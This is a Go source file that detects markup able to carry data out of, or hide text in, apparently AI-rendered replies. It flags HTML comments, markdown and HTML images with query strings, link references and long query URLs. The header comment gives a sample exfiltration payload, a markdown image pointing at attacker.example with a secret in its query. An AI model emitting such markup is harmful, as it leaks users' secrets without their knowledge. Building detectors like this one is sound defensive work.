package detect

import (
	"bytes"
)

// Markup that carries data out or hides text.
//
// A markdown image is fetched by the client as soon as the reply renders:
// ![](https://attacker.example/c?d=<secret>) sends the secret with no click.
// A link needs a click, and a bare URL with a long query is only suspicious.
// HTML comments are invisible in rendered markdown but read by the model.
const (
	maxURLBytes  = 4096 // a URL longer than this is judged at this length
	maxLinkLabel = 256  // how far back to look for the "[" of a link
)

var (
	imageOpen  = []byte("![")
	commentBeg = []byte("<!--")
	commentEnd = []byte("-->")
)

// htmlComments reports every <!-- ... --> (or an unterminated <!--).
func (s *scan) htmlComments() {
	l := s.text
	for off := 0; ; {
		i := bytes.Index(l[off:], commentBeg)
		if i < 0 {
			return
		}
		start := off + i
		end := len(l)
		if j := bytes.Index(l[start+len(commentBeg):], commentEnd); j >= 0 {
			end = start + len(commentBeg) + j + len(commentEnd)
		}
		s.emit(RuleHTMLComment, s.pick(High, "", Low, Medium), start, end, quote(s.text, start, end))
		if s.count[RuleHTMLComment] >= maxPerRule {
			return
		}
		off = end
	}
}

// isURLEnd reports a byte that ends a URL in text.
func isURLEnd(c byte) bool {
	switch c {
	case ' ', '\t', '\n', '\r', '"', '\'', '<', '>', '(', ')', '[', ']', '{', '}', '`', '\\', 0x1b:
		return true
	}
	return false
}

// urlState is the URL the pass is inside: text[start:...], with its first
// '?' and first '#' after it (-1 when none yet).
type urlState struct {
	start, query, hash int
	markdown           bool // the target of a markdown link or image: "](" before it
	refdef             bool // a reference definition: "[label]: URL"
	img                bool // an HTML image: src="URL"
}

// startURL is called by the pass when the word text[ws:i] is followed by
// ':' at i. It returns the URL state if that starts an http(s) URL.
func (s *scan) startURL(ws, i int) (urlState, bool) {
	scheme := i-ws == 4 && s.at(ws, "http") || i-ws == 5 && s.at(ws, "https")
	if !scheme || !s.at(i, "://") {
		return urlState{}, false
	}
	u := urlState{start: ws, query: -1, hash: -1, markdown: s.at(ws-2, "](") || s.at(ws-3, "](<")}
	j := ws - 1
	if c := s.byteAt(j); c == '"' || c == '\'' {
		j--
	}
	u.img = s.at(j-3, "src=")
	j = ws - 1
	for j >= 0 && (s.text[j] == ' ' || s.text[j] == '\t') {
		j--
	}
	u.refdef = s.byteAt(j) == ':' && s.byteAt(j-1) == ']'
	return u, true
}

// endURL judges the URL text[u.start:end] once the pass reaches its end.
func (s *scan) endURL(u urlState, end int) {
	if u.query < 0 {
		return
	}
	qEnd := end
	if u.hash > u.query {
		qEnd = u.hash
	}
	qLen := qEnd - u.query - 1
	hasEq := bytes.IndexByte(s.text[u.query:qEnd], '=') >= 0
	switch {
	case u.img && qLen > 0:
		s.emit(RuleMarkdownExfil, s.pick(High, "", High, High), u.start, end, "HTML image with a query string: "+quote(s.text, u.start, end))
		return
	case u.refdef && qLen > 0 && bytes.Contains(s.text, imageOpen):
		// "![alt][label]" uses it: fetched without a click
		s.emit(RuleMarkdownExfil, s.pick(High, "", High, High), u.start, end, "markdown image reference with a query string: "+quote(s.text, u.start, end))
		return
	case u.refdef && hasEq:
		s.emit(RuleMarkdownExfil, s.pick(High, "", Medium, Medium), u.start, end, "markdown link reference with a query string: "+quote(s.text, u.start, end))
		return
	}
	if u.markdown {
		at := u.start - 2
		if s.byteAt(at) != ']' {
			at-- // "](<"
		}
		start := s.labelStart(at)
		switch {
		case start > 0 && s.text[start-1] == '!' && qLen > 0:
			s.emit(RuleMarkdownExfil, s.pick(High, "", High, High), start-1, end, "markdown image with a query string: "+quote(s.text, u.start, end))
			return
		case hasEq:
			s.emit(RuleMarkdownExfil, s.pick(High, "", Medium, Medium), max(start, 0), end, "markdown link with a query string: "+quote(s.text, u.start, end))
			return
		}
	}
	if qLen > urlQueryMax {
		s.emit(RuleMarkdownExfil, s.pick(High, "", Low, Low), u.start, end, "URL with a long query string: "+quote(s.text, u.start, end))
	}
}

// labelStart finds the "[" that opens the label ending at "](" (at), or -1.
func (s *scan) labelStart(at int) int {
	lo := max(0, at-maxLinkLabel)
	depth := 0
	for i := at - 1; i >= lo; i-- {
		switch s.text[i] {
		case ']':
			depth++
		case '[':
			if depth == 0 {
				return i
			}
			depth--
		}
	}
	return -1
}
